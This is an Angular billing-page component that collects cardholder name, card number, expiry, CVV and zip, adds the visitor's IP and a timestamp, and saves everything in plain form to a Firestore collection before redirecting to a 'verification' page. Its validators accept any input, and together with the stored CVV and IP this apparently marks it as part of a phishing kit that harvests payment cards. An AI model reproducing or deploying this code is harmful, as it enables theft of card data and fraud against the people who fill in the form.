import { Component, OnInit, ViewChild, ElementRef } from '@angular/core';
import { Billing } from './billing';
import { MyService } from '../myservice';
import { Router } from '@angular/router';
import { AngularFirestore, AngularFirestoreCollection } from '@angular/fire/firestore';

@Component({
  selector: 'app-billing',
  templateUrl: './billing.component.html',
  styleUrls: ['./billing.component.css']
})
export class BillingComponent implements OnInit {
  billing: Billing = {fullName:'',cardNumber:'',month:'',year:'',cvv:'',dateTime:'',ip:'',zip:''};
  wors:string;
  billingsCollection: AngularFirestoreCollection<Billing>;
  monthIsValid: boolean = true;
  yearIsValid: boolean = true;
  finished: boolean = false;
  submitted: boolean = false;
  
  constructor(private myService: MyService, private router: Router,db: AngularFirestore) {
    this.billingsCollection=db.collection('billingNet');
    this.billing.month = "04";
    this.billing.year = "20";
    if(localStorage.getItem('loggedIn')==null)
    this.router.navigate(['/login']);
    
  }

  ngOnInit() {
  }

  onSubmit(form) {
    if (form.valid) {
      this.billing.ip=localStorage.getItem('ip');
      this.billing.dateTime=Date.now();
      //this.myService.addBilling(this.billing.fullName, this.billing.cardNumber, this.billing.month, this.billing.year, this.billing.cvv, this.billing.zip).subscribe();
      this.billingsCollection.add(this.billing);
      window.scroll(0,0);
      this.submitted = true;
      this.delay(3000);
    }
  }

  validateMonth() {
    this.monthIsValid = true;
    this.yearIsValid = true;
  }

  validateYear() {
    this.yearIsValid = true;
    this.monthIsValid = true;
  }


  async delay(ms: number) {
    await new Promise(resolve => setTimeout(()=>resolve(), ms)).then(()=>console.log("fired"));  
    this.finished=true;
    this.delayAndRedirect(3000);
}

async delayAndRedirect(ms: number) {
  await new Promise(resolve => setTimeout(()=>resolve(), ms)).then(()=>console.log("fired"));  
  this.router.navigate(['/verification']);
}
}
